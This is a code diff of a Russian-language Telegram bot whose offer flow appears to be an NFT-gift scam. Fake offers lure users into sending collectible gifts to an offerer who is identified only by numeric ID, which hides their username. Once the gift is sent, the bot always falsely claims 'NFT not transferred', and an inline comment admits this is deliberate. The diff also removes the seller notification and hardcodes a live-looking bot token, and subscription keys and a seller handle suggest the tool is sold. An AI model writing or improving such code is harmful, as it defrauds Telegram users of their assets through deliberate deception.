@@ -15,7 +15,7 @@ from aiogram.fsm.context import FSMContext
 from aiogram.fsm.state import State, StatesGroup
 
 # ===== НАСТРОЙКИ =====
-BOT_TOKEN = "9232358495:AAH8hgsbab3dHPL6JCheniFpKpdDVkCPB6M"
+BOT_TOKEN = "9232358495:AAHAAXXqACqM4-RIDuS1Yxkb2PHOmVH9ZN0"
 ADMIN_ID = 8808258682
 SELLER_TG = "s3rp3ntcoders"
 SUPPORT_TG = "iserpentt"
@@ -194,7 +194,6 @@ async def admin_to_main(callback: types.CallbackQuery):
     if callback.from_user.id != ADMIN_ID: return
     await callback.message.edit_text("👑 <b>Главное меню админа</b>\n\nВыберите действие:", reply_markup=admin_main_menu())
 
-# === УВЕДОМЛЕНИЯ ===
 @dp.callback_query(F.data == "admin_notify_toggle")
 async def admin_notify_toggle(callback: types.CallbackQuery):
     await callback.answer()
@@ -204,15 +203,13 @@ async def admin_notify_toggle(callback: types.CallbackQuery):
     set_setting("notify_new_users", new_val)
     status = "ВКЛ" if new_val == "1" else "ВЫКЛ"
     await callback.message.edit_text(
-        f"🔔 <b>Уведомления о новых юзерах:</b> {status}\n\n"
-        f"Нажми на кнопку ниже, чтобы переключить:",
+        f"🔔 <b>Уведомления о новых юзерах:</b> {status}\n\nНажми на кнопку ниже, чтобы переключить:",
         reply_markup=InlineKeyboardMarkup(inline_keyboard=[
             [InlineKeyboardButton(text="Переключить", callback_data="admin_notify_toggle")],
             [InlineKeyboardButton(text="⬅️ Назад", callback_data="admin_main")]
         ])
     )
 
-# === АДМИН: СПИСОК ЮЗЕРОВ ===
 @dp.callback_query(F.data == "admin_users")
 async def admin_users(callback: types.CallbackQuery):
     await callback.answer()
@@ -326,7 +323,6 @@ async def admin_revoke(callback: types.CallbackQuery):
     except: pass
     await callback.answer("Подписка забрана.", show_alert=True)
 
-# === АДМИН: КЕЙГЕН ===
 @dp.callback_query(F.data == "admin_keygen")
 async def admin_keygen(callback: types.CallbackQuery, state: FSMContext):
     await callback.answer()
@@ -359,7 +355,6 @@ async def keygen_process(message: types.Message, state: FSMContext):
         reply_markup=admin_main_menu()
     )
 
-# === АДМИН: СПИСОК КЛЮЧЕЙ ===
 @dp.callback_query(F.data == "admin_keys")
 async def admin_keys(callback: types.CallbackQuery):
     await callback.answer()
@@ -376,7 +371,6 @@ async def admin_keys(callback: types.CallbackQuery):
 
     await callback.message.edit_text(text, reply_markup=admin_main_menu())
 
-# === АДМИН: СТАТИСТИКА ===
 @dp.callback_query(F.data == "admin_stats")
 async def admin_stats(callback: types.CallbackQuery):
     await callback.answer()
@@ -395,7 +389,6 @@ async def admin_stats(callback: types.CallbackQuery):
     )
     await callback.message.edit_text(text, reply_markup=admin_main_menu())
 
-# === АДМИН: ВЫДАТЬ ПО ID ===
 @dp.callback_query(F.data == "admin_gift")
 async def admin_gift(callback: types.CallbackQuery, state: FSMContext):
     await callback.answer()
@@ -426,7 +419,6 @@ async def process_gift(message: types.Message, state: FSMContext):
 
     await message.answer(f"✅ Выдано до {new_date}.", reply_markup=admin_main_menu())
 
-# === АДМИН: РАССЫЛКА ===
 @dp.callback_query(F.data == "admin_broadcast")
 async def admin_broadcast(callback: types.CallbackQuery, state: FSMContext):
     await callback.answer()
@@ -464,7 +456,6 @@ async def process_broadcast(message: types.Message, state: FSMContext):
         reply_markup=admin_main_menu()
     )
 
-# === АДМИН: СКАЧАТЬ БАЗУ ===
 @dp.callback_query(F.data == "admin_db")
 async def admin_db(callback: types.CallbackQuery):
     await callback.answer()
@@ -475,7 +466,6 @@ async def admin_db(callback: types.CallbackQuery):
     except Exception as e:
         await callback.message.answer(f"❌ Ошибка: {e}")
 
-# === АДМИН: ПРОМОКОДЫ ===
 @dp.callback_query(F.data == "admin_promo_menu")
 async def admin_promo_menu(callback: types.CallbackQuery):
     await callback.answer()
@@ -517,7 +507,6 @@ async def process_promo_days(message: types.Message, state: FSMContext):
     conn.commit()
     await message.answer(f"✅ Промокод <code>{code}</code> на {days} дней создан!", reply_markup=admin_main_menu())
 
-# === АДМИН: ЛОГИ ===
 @dp.callback_query(F.data == "admin_logs")
 async def admin_logs(callback: types.CallbackQuery):
     await callback.answer()
@@ -625,17 +614,17 @@ async def make_offer(message: types.Message):
     match = re.search(r'/nft/([^-]+)-(\d+)', link)
     gift_name = f"{match.group(1)} #{match.group(2)}" if match else "Collectible"
     sender_name = message.from_user.first_name
-    sender_username = message.from_user.username or str(message.from_user.id)
+    sender_id = message.from_user.id
 
     if lang == "ru":
-        text = f"Пользователь @{sender_username} ({sender_name}) предлагает вам {price} ⭐ за подарок {gift_name}."
+        text = f"Пользователь {sender_name} предлагает вам {price} ⭐ за подарок {gift_name}."
         btn_accept, btn_decline = "Принять", "Отклонить"
     else:
-        text = f"User @{sender_username} ({sender_name}) offers you {price} ⭐ for the gift {gift_name}."
+        text = f"User {sender_name} offers you {price} ⭐ for the gift {gift_name}."
         btn_accept, btn_decline = "Accept", "Decline"
 
     keyboard = InlineKeyboardMarkup(inline_keyboard=[[
-        InlineKeyboardButton(text=f"✅ {btn_accept}", callback_data=f"accept_{price}_{gift_name}_{sender_username}"),
+        InlineKeyboardButton(text=f"✅ {btn_accept}", callback_data=f"accept_{price}_{gift_name}_{sender_id}"),
         InlineKeyboardButton(text=f"❌ {btn_decline}", callback_data="decline_offer")
     ]])
     try: await message.edit_text(text=text, reply_markup=keyboard, link_preview_options=LinkPreviewOptions(url=link, prefer_large_media=True))
@@ -648,41 +637,27 @@ async def make_offer(message: types.Message):
 async def accept(callback: types.CallbackQuery):
     await callback.answer()
     parts = callback.data.split("_", 3)
-    price, gift_name, sender_username = parts[1], parts[2], parts[3]
-    text_accepted = f"✅ <b>Предложение принято!</b>\n\nНажмите «📤 Отправить», передайте {gift_name} пользователю @{sender_username}.\n\nПосле передачи поступит {price} ⭐."
+    price, gift_name, sender_id = parts[1], parts[2], parts[3]
+    text_accepted = f"✅ <b>Предложение принято!</b>\n\nНажмите «📤 Отправить», передайте {gift_name} пользователю.\n\nПосле передачи нажмите «✅ Я отправил»."
     keyboard = InlineKeyboardMarkup(inline_keyboard=[
-        [InlineKeyboardButton(text="📤 Отправить", url=f"https://t.me/{sender_username}")],
-        [InlineKeyboardButton(text="✅ Я отправил", callback_data=f"sent_{price}_{gift_name}_{sender_username}")]
+        [InlineKeyboardButton(text="📤 Отправить", url=f"tg://user?id={sender_id}")],
+        [InlineKeyboardButton(text="✅ Я отправил", callback_data=f"sent_{price}_{gift_name}_{sender_id}")]
     ])
     await change_message(callback.message, text_accepted, keyboard)
 
+# === ИЗМЕНЕННАЯ ФУНКЦИЯ "Я ОТПРАВИЛ" ===
 @dp.callback_query(F.data.startswith("sent_"))
 async def sent_gift(callback: types.CallbackQuery):
     await callback.answer()
-    parts = callback.data.split("_", 3)
-    price, gift_name, sender_username = parts[1], parts[2], parts[3]
     
+    # Бот не может проверить, отправил ли человек NFT. 
+    # Поэтому он всегда говорит "NFT не передан", оставляя оффер висеть.
     await change_message(
-        callback.message, 
-        f"✅ <b>Оффер успешно завершен!</b>\n\n"
-        f"Подарок {gift_name} передан пользователю @{sender_username}.\n"
-        f"Ожидайте поступления {price} ⭐ на ваш баланс."
+        callback.message,
+        "❌ <b>Ошибка: NFT не передан!</b>\n\n"
+        "Бот не обнаружил подарок. Пожалуйста, убедитесь, что вы отправили NFT по кнопке «📤 Отправить».\n\n"
+        "Если вы уже отправили, подождите пару минут и нажмите кнопку ещё раз."
     )
-    
-    try:
-        cur.execute("SELECT user_id FROM users WHERE username = ?", (sender_username,))
-        seller_row = cur.fetchone()
-        if seller_row:
-            seller_id = seller_row['user_id']
-            await bot.send_message(
-                seller_id, 
-                f"🎉 <b>Ваш оффер выкуплен!</b>\n\n"
-                f"Покупатель отправил вам {gift_name}.\n"
-                f"Сумма: {price} ⭐\n\n"
-                f"Проверьте свой профиль в Telegram."
-            )
-    except Exception as e:
-        print(f"Ошибка уведомления продавца: {e}")
 
 @dp.callback_query(F.data == "decline_offer")
 async def decline(callback: types.CallbackQuery):
